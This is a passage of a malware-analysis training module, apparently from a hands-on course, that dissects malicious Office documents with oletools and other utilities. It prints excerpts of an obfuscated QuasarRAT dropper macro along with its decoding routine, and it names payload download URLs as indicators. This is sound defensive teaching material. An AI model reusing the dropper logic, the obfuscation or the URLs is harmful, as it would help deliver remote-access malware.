- **Havoc**: `HavocC:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc`
- **SnakeKeylogger**: `C:\Tools\MalDoc\Office\Demo\Samples\SnakeKeylogger\sample.docx.zip`
- **XWorm**: `C:\Tools\MalDoc\Office\Demo\Samples\xworm\sample.rtf`

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

The easiest way to detect the presence of macros inside an Office file is by using the `oleid.py` Python utility followed by the document for analysis.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oleid.py C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx

```

![office-analysis](YgiGDkv7Qmv8.png)

* * *

## Office File Formats

Office documents can be saved in various formats, with the most common being:

- `Object Linking and Embedding (OLE)`
- `Office Open XML (OOXML)`
- `Rich Text Format (RTF)`

![office-analysis](q0ynEMjMaWKC.png)

### Object Linking and Embedding (OLE)

It is the legacy binary format used in older versions of Office documents. Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or [Compound Document File Format](https://en.wikipedia.org/wiki/Compound_File_Binary_Format)), such as Microsoft Office 97-2003 documents. Some examples of the file extensions that are based on the OLE format include `.doc`, `.xls` and `.ppt`. These files can contain embedded objects and macros.

An OLE file is a compound file that can be thought of as a mini file system or ZIP archive. It contains multiple streams of data, each with its own name, much like files within a directory.

#### Structure of OLE Files

- `Storages`: This is akin to a directory in a file system. It can contain multiple streams and other storages.
- `Streams`: This is similar to a file within a directory. Each stream contains data and has a unique name. For example, `WordDocument` is the main stream in a Word document containing the text.
- `Properties`: These are streams that contain information about the document, such as the author, title, creation date, and modification date. Property streams always start with `x05`.

The Python script `oledir` helps in showing the layout of an OLE file.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oledir.py C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

```

In the output below in the screenshot we can see the stream, storage and properties.

![office-analysis](210Hsotz0gnB.png)

* * *

### Office Open XML (OOXML)

[OOXML](https://en.wikipedia.org/wiki/Office_Open_XML) is a zipped, XML-based file format developed by Microsoft for representing spreadsheets, charts, presentations, and word processing documents. This is the latest format, which was introduced with Microsoft Office 2007, marking a significant shift from the binary formats previously used by Office applications. Some examples of the file extensions that are based on the OOXML format include `.docx`, `.xlsx`, and `.pptx`.

#### Structure of OOXML Files

An OOXML file (e.g., .docx, .xlsx, .pptx) contains several components, as mentioned as follows:

- `[Content_Types].xml`: Describes all the types of contents included in the archive.
- `_rels/.rels`: Relationships file that defines the connections between different parts of the document.
- `word, xl, ppt`: Main directories containing document-specific data. For example, `word/document.xml` is the main document content for Word files.
- `Media Files`: Images and other media included in the document.
- `Custom XML Data`: Custom data specific to the document.
- `Macros`: Scripts and macros used in the document, if any.

Since it is a zipped format, we can unzip it using the `Expand-Archive` PowerShell cmdlet, which extracts files from a specified zipped archive file to a specified destination folder.

```powershell
PS C:\> Expand-Archive C:\Tools\MalDoc\Office\Demo\Samples\SnakeKeylogger\sample.docx.zip C:\Tools\MalDoc\Office\Demo\Samples\SnakeKeylogger\OOXML_Output_DOCX -Force

```

The screenshot below shows the layout and structure of files contained inside it.

![office-analysis](ZmLuUOWokBFT.png)

* * *

### Rich Text Format (RTF)

The Rich Text Format (often abbreviated as [RTF](https://en.wikipedia.org/wiki/Rich_Text_Format)) is a proprietary document file format with a published specification developed by Microsoft Corporation from 1987 until 2008 for cross-platform document interchange with Microsoft products. The RTF file format encodes text and graphics for sharing between different applications. Unlike binary formats such as .doc or OOXML formats like .docx, RTF files are composed of plain text, control words, groups, backslashes, and delimiters. This makes RTF files highly portable and easily readable by various text editors and word processors across different platforms.

#### Characteristics of RTF

- `Text and Graphics Encoding`: Encodes text and graphics in a plain text format.
- `Cross-Platform Compatibility`: Can be opened by various applications without the need for Microsoft Office or even a Windows operating system.
- `No Macro Support`: Unlike OOXML formats, RTF files do not support macros, reducing the risk of macro-based attacks.

Despite the lack of macro support, RTF files can still be used in attacks through embedded objects (such as OLE1 objects), binary contents, or exploits targeting vulnerabilities in RTF parsers.

![office-analysis](ypm4925M3kEa.png)

For detailed analysis, we will use the `rtfdump.py` Python utility (a part of Didier Stevens Suite), which can be downloaded from the official GitHub [repository](https://github.com/DidierStevens/DidierStevensSuite/blob/master/rtfdump.py). This utility can be executed inside the target (VM) at the following path:

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\rtfdump.py C:\Tools\Maldoc\Office\Demo\Samples\xworm\sample.rtf

```

![office-analysis](DfBp8t8uihv6.png)

We'll study these formats in depth in the next sections.

* * *


# Office Document - VBA Macro Analysis

## Analysis Process

Let's start with the MS Office document format first. To get started, let's review the different file types that we know.

| File Type | Description |
| --- | --- |
| doc | Microsoft Word document before Word 2007 |
| docm | Microsoft Word macro-enabled document |
| docx | Microsoft Word document (Open XML format, Latest) |
| dot/dotx/dotm | Word template files. |

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **trid**: `trid` is added in environmental variables. In command prompt, simply type `trid` and provide file path.
- **oleid**: `C:\Tools\MalDoc\Office\Tools\oletools\oleid.py`
- **oledir**: `C:\Tools\MalDoc\Office\Tools\oletools\oledir.py`
- **olemeta**: `C:\tools\maldoc\office\tools\oletools\olemeta.py`
- **oletimes**: `C:\tools\maldoc\office\tools\oletools\oletimes.py`
- **olevba**: `C:\tools\maldoc\office\tools\oletools\olevba.py`
- **Havoc Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc`

We'll take a sample [3dfddb91261f5565596e3f014f9c495a.doc](https://www.virustotal.com/gui/file/ba64d69516da5815369a03f25e567a3edf1473e6da5884b1485f3142d334767f/detection), which is tagged under the malware family (signature) of `Havoc`. Below are the details:

| Name | Description |
| --- | --- |
| `File Name` | 3dfddb91261f5565596e3f014f9c495a.doc |
| `MD5 Hash` | 3dfddb91261f5565596e3f014f9c495a |
| `Malware Family/Tags` | Havoc |
| `Detections` | [VirusTotal](https://www.virustotal.com/gui/file/ba64d69516da5815369a03f25e567a3edf1473e6da5884b1485f3142d334767f/detection) |
| `Target (VM) Path` | C:\\Tools\\MalDoc\\Office\\Demo\\Samples\\Havoc\\3dfddb91261f5565596e3f014f9c495a.doc |

The screenshot below shows the details of this sample within the [MalwareBazaar](https://bazaar.abuse.ch/sample/ba64d69516da5815369a03f25e567a3edf1473e6da5884b1485f3142d334767f/) database.

![Maldoc](7bNSdGnoZf3l.png)

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

Initially, when we don't know about a file type, we can extract some basic information about the sample using `trid.exe`. This will provide us with the information related to what kind of sample we're dealing with.

```cmd-session

C:\> trid C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
Definitions found:  18049
Analyzing...

Collecting data from file: C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc
 52.6% (.DOC) Microsoft Word document (30000/1/2)
 33.3% (.DOC) Microsoft Word document (old ver.) (19000/1/2)
 14.0% (.) Generic OLE2 / Multistream Compound (8000/1)

```

The output indicates that it is a DOC file and also contain an OLE object. We can use `olemeta.py`, which is a script to parse OLE files such as MS Office documents (e.g., Word, Excel). This script extracts all standard properties present in the OLE file.

```cmd-session
C:\> python c:\tools\maldoc\office\tools\oletools\olemeta.py  C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

olemeta 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1252                          |
|title                |                              |
|subject              |                              |
|author               |REDACTED                      |
|keywords             |                              |
|comments             |                              |
|template             |Testing.dot                   |
|last_saved_by        |REDACTED                      |
|revision_number      |5                             |
|total_edit_time      |1620                          |
|create_time          |2023-12-13 21:41:00           |
|last_saved_time      |2023-12-16 01:17:00           |
|num_pages            |1                             |
|num_words            |1                             |
|num_chars            |7                             |
|creating_application |Microsoft Office Word         |
|security             |0                             |
+---------------------+------------------------------+

Properties from the DocumentSummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage_doc         |1252                          |
|lines                |1                             |
|paragraphs           |1                             |
|scale_crop           |False                         |
|heading_pairs        |[b'Title', 1]                 |
|titles_of_parts      |[b'']                         |
|company              |                              |
|links_dirty          |False                         |
|chars_with_spaces    |7                             |
|shared_doc           |False                         |
|hlinks_changed       |False                         |
|version              |1048576                       |
+---------------------+------------------------------+

```

To get the timestamp information, we can use the `oletimes.py` Python script, which parses OLE files such as MS Office documents (e.g., Word, Excel) to extract creation and modification times of all streams and storages in the OLE file.

```cmd-session
C:\> python C:\tools\maldoc\office\tools\oletools\oletimes.py  C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

```

![office-analysis](B80hlIWwwJ4z.png)

In the above screenshot, we can observe the timestamps associated with `Macros`.

Next, we can use `oleid.py` to get more information related to the sample. This is a script to analyze OLE files, such as MS Office documents (e.g., Word, Excel), to detect specific characteristics usually found in malicious files (e.g., malware). For example, it can detect VBA macros and embedded Flash objects.

```cmd-session
C:\> python C:\tools\maldoc\office\tools\oletools\oleid.py C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

```

![office-analysis](FrlHLxw1dCKP.png)

We can see there are `VBA macros` present. Let us check this using the `olevba` utility. This script is used to open a MS Office file, detect if it contains VBA macros, and extract and analyze the VBA source code from your own Python applications.

```cmd-session
C:\> python C:\tools\maldoc\office\tools\oletools\olevba.py C:\Tools\MalDoc\Office\Demo\Samples\Havoc\3dfddb91261f5565596e3f014f9c495a.doc

```

The screenshot below shows the macro code:

![office-analysis](NUB2MQ0bSFZ5.png)

It identified several suspicious keywords present in the file:

![office-analysis](WLpiI95zf9eX.png)

This provides us with the URL ( `http[:]//www[.]shieldwise[.]online`) as an indicator of compromise (IOC), where the malicious executable is hosted with the name `UpdateCheck.exe`. This file is not available at the moment for further analysis.

In the next section, we'll analyze another sample — a complex and heavily obfuscated malicious document that installs QuasarRAT malware on the target system.

* * *


# Obfuscated VBA Macro Analysis

**Note:** Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), you can locate the malicious samples and tools at the following paths:

- **oleid**: `C:\Tools\MalDoc\Office\Tools\oletools\oleid.py`
- **olevba**: `c:\tools\maldoc\office\tools\oletools\olevba.py`
- **Online VB Compiler**: `https://www.onlinegdb.com/online_vb_compiler`
- **QuasarRAT Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx`

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

## Quasar RAT (Obfuscated Macro code)

In this section, we'll analyze another sample, which is little more complicated and a heavily obfuscated malicious document that drops `QuasarRAT` malware on the system. We'll take a sample renamed as [QuasarRAT.docx](https://www.virustotal.com/gui/file/ba3324366a76daea76cb9a0d78c5367085091ec5efa75eb41120d66cee286881/detection), which is tagged under the malware family (signature) of `QuasarRAT`, `xRAT`. The details related to this sample are as follows:

| Name | Description |
| --- | --- |
| File Name | QuasarRAT.docx |
| MD5 Hash | 8c25db407a860024f7afdf84badcf4c1 |
| Malware Family/Tags | QuasarRAT, xRAT |
| Detections | [Virustotal](https://www.virustotal.com/gui/file/ba3324366a76daea76cb9a0d78c5367085091ec5efa75eb41120d66cee286881/detection) |
| VM Location | `C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx` |

Initial analysis can be performed using the `oleid.py` script followed by the document for analysis.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oleid.py C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx

```

![office-analysis](PT74i9QIhIAD.png)

Next, we can run the `olevba` Python utility to extract more details related to the macro in the document.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\olevba.py C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.12.4 - http://decalage.info/python/oletools
===============================================================================
FILE: C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: C:\Tools\MalDoc\Office\Demo\Samples\QuasarRAT\QuasarRAT.docx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Function Wouynfb() As Byte
Wouynfb = 0
Call riztuo
End Function
Function riztuo() As Currency
riztuo = 1000000000
Call fitiob
End Function
Function fitiob() As Double
Call WEitiobb
End Function
Function WEitiobb() As Integer
WEitiobb = 61
Call Piotbdek
End Function
Function Piotbdek() As Long
Piotbdek = Piotbdek
Call Diotbdek
End Function

    Public Function ¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬(´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯)
        ²»½¾º¦³¢«¹º¨¹»«®·¿¡¡¿ª£¾¥½£¸¨¸¾»©¼¦¿©¦¨¡¹®¨§¢¼¹¤£¯«°¶¡®¿¿¾®¸¼¯¥»»ª¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹ = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
        ¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢ = " ¿¡@#$%^&*()_+|01²³456789ÀbÁdÂÃghÄjklmÅÒÓqÔÕÖÙvwÛÜz.,-~AàáâãFGHäJKåMNØ¶QR§TÚVWX¥Z?!23acefinoprstuxyBCDEILOPSUY"
        For U = 1 To Len(´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯)

...SNIP...

' Line #94:
'       Ld ¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶
'       Paren
'       Ld MsgBox
'       ArgsMemCall Open 0x0001
' Line #95:
'       EndSub
' Macros/VBA/NewMacros - 934 bytes
' Line #0:
'       FuncDefn (Sub wiztuo())
' Line #1:
'       QuoteRem 0x0000 0x0000 ""
' Line #2:
'       QuoteRem 0x0000 0x000A " doc Macro"
' Line #3:
'       QuoteRem 0x0000 0x0000 ""
' Line #4:
'       QuoteRem 0x0000 0x0000 ""
' Line #5:
' Line #6:
'       EndSub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|adodb.stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|microsoft.xmlhttp   |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

```

The output from `olevba.py` is displayed below, highlighting the suspicious keywords.

![office-analysis](j7fBwfK4eAGa.png)

We can see the use of the `AutoExec` function to trigger code execution when a user opens the document.

![Maldoc](bCnSjwSNASNB.png)

We can refer to [Microsoft's](https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros) documentation to learn more about auto macros and their functionalities.

The VBA code produced by `olevba` is shown below. As you can see the script is heavily obfuscated by using variable names with special characters.

![office-analysis](aiFtJsvz6Msq.png)

Looking past the layer of obfuscation, we can still see VBA functions like `CreateObject`, `Open`, `Write`, and `SaveToFile`. The functions within this code reveal the script's operational mechanism. This script functions as a dropper, designed to retrieve a QuasarRAT payload from an external source. Upon successfully downloading the payload, the script writes it to the disk, preparing it for execution. Finally, it proceeds to execute the payload on the system, initiating the malicious activity. This sequence of actions is characteristic of dropper behavior, where the primary purpose is to facilitate the deployment of additional malicious software. Here's a [link](https://learn.microsoft.com/en-us/office/vba/language/reference/functions-visual-basic-for-applications) to the Microsoft documentation to learn more about the VBA functions.

![office-analysis](VCyLmHpDdyF8.png)

The "Templates" directory path is stored in " `JbjhvSpecialPathLbl`" variable.

```vbscript
JbjhvSpecialPathLbl = WshShell.SpecialFolders("Templates")

```

![Maldoc](vjq7odktfkTs.png)

A string variable is initialized by concatenating " `\NäXVVÚ.ÂÛÂ`" and the Templates directory path.

```vbscript
¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯®·¬©¥«¸½½½¿¢³·¦² = JbjhvSpecialPathLbl + ¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬("\NäXVVÚ.ÂÛÂ")

```

![Maldoc](S00R58MXhtk5.png)

Interestingly " `\NäXVVÚ.ÂÛÂ`" is deobfuscated before the concatenation operation. The deobfuscation function name is " `¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬`". The function definition is shown below:

```vbscript
Public Function ¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬(´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯)
        ²»½¾º¦³¢«¹º¨¹»«®·¿¡¡¿ª£¾¥½£¸¨¸¾»©¼¦¿©¦¨¡¹®¨§¢¼¹¤£¯«°¶¡®¿¿¾®¸¼¯¥»»ª¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹ = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
        ¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢ = " ¿¡@#$%^&*()_+|01²³456789ÀbÁdÂÃghÄjklmÅÒÓqÔÕÖÙvwÛÜz.,-~AàáâãFGHäJKåMNØ¶QR§TÚVWX¥Z?!23acefinoprstuxyBCDEILOPSUY"
        For U = 1 To Len(´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯)
            »¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯®·¬©¥«¸½½½¿¢³·¦²²»½¾º¦³¢«¹ = InStr(²»½¾º¦³¢«¹º¨¹»«®·¿¡¡¿ª£¾¥½£¸¨¸¾»©¼¦¿©¦¨¡¹®¨§¢¼¹¤£¯«°¶¡®¿¿¾®¸¼¯¥»»ª¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹, Mid(´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯, U, 1))
            If »¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯®·¬©¥«¸½½½¿¢³·¦²²»½¾º¦³¢«¹ > 0 Then
                º¨¹»«®·¿¡¡¿ª£¾¥½£¸¨¸¾»©¼¦¿©¦¨¡¹®¨§¢¼¹¤£¯«°¶¡®¿¿¾®¸¼¯¥»»ª¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹ = Mid(¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢, »¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯®·¬©¥«¸½½½¿¢³·¦²²»½¾º¦³¢«¹, 1)
                ¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨ = ¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨ + º¨¹»«®·¿¡¡¿ª£¾¥½£¸¨¸¾»©¼¦¿©¦¨¡¹®¨§¢¼¹¤£¯«°¶¡®¿¿¾®¸¼¯¥»»ª¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹
            Else
                ¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨ = ¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨ + Mid(´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨²´µ°¾§«º¡°½¡²º¯£¶¢ª¶«¬µ§´¥¢½¢µ°¼º§¶ª¿½ª¡¸ª½«³¡¯, U, 1)
            End If
        Next
        ¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬ = ¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬´¤¥©³°¾¤º¾¼¬ª¢»¼®§ª·¯¤¹«¯º¢´´³¶£§£¿¨¨
    End Function

```

To deobfuscate the strings in the script, we will need to clean up this code and run it independently.

A helpful trick is to use a code editor like `Visual Studio Code`. As shown below, you can paste the code into the editor and easily change variable names to a more readable format by selecting "Change All Occurrences".

![office-analysis](PZLiMzGxWxDS.png)

After cleanup, the deobfuscation logic should look like the code shown in the snippet below. Here, all of the unreadable variables present in the script are replaced by X, C, U, Y, and B. The function name is also changed from " `*¾¯»¥¼¡¢¬¼§¬½ª¤®¯¹¹¥¡·§µ¨·®¦®¯¼¨©´¦°µ²¹¬«²³¸©»£·¥¢º¿¹¤¦¦§¤¬¾¬¶©¼©§¥ªµ©º°£©³£¨°¶¤¤«»¤º®¥¾¦¯¬`" to " `enc`".

```vbscript
Public Function enc(param AS string)
        DIM X,C,U,Y,A,B
        X = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
        C = " ¿¡@#$%^&*()_+|01²³456789ÀbÁdÂÃghÄjklmÅÒÓqÔÕÖÙvwÛÜz.,-~AàáâãFGHäJKåMNØ¶QR§TÚVWX¥Z?!23acefinoprstuxyBCDEILOPSUY"
        For U = 1 To Len(param)
            Y = InStr(X, Mid(param, U, 1))
            If Y > 0 Then
                A = Mid(C, Y, 1)
                B = B + A
            Else
                B = B + Mid(param, U, 1)
            End If
        Next
        enc = B
    End Function

End Module

```

Now we can execute the above code to print the decrypted string, which is the IOC (indicator of compromise). The easiest way to run this and print this information is by using an [online](https://www.onlinegdb.com/online_vb_compiler) VB compiler.

![](Q1Pxr5ei0Xb8.png)

As you can see from the above image, we have successfully implemented the deobfuscation logic.

The script fetches an executable `cpscontents.exe`, from the domain `transportesevaristomadero[.]com` by visiting the URL mentioned below: `www[.]transportesevaristomadero[.]com/cpscontent/contetxjbzfkbxfzblzfxfzbxbfzvzdflvbsdfgsbcompser/cpscontents[.]exe`

It saves the downloaded file in the Templates special directory as `NIXVVU.exe`. Finally, this dropped file is executed by calling the `Open` function via the `Shell.Application` object.At the time of analysis of this sample, this executable was taken down from this domain.

In this section, we learned that the VBA code can contain high levels of obfuscation and the possibility of identifying and printing the IOCs.

* * *


# Analysis of External Relationships

## Introduction

Adversaries have attempted to use Office documents to exploit remote code execution vulnerabilities. For example, in the case of [CVE-2021-40444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444), adversaries launched an initial access campaign that distributed custom Cobalt Strike Beacon loaders. These loaders communicated with an infrastructure that Microsoft associates with multiple cybercriminal campaigns, including human-operated ransomware. The vulnerability lies in `MSHTML`, and the attack vector relies on a malicious ActiveX control that could be loaded by the browser rendering engine using a malicious Office document. Adversaries have used specially crafted Microsoft Office documents, which we'll discuss in this section.

![office-analysis](31tECvP0BZ9M.png)

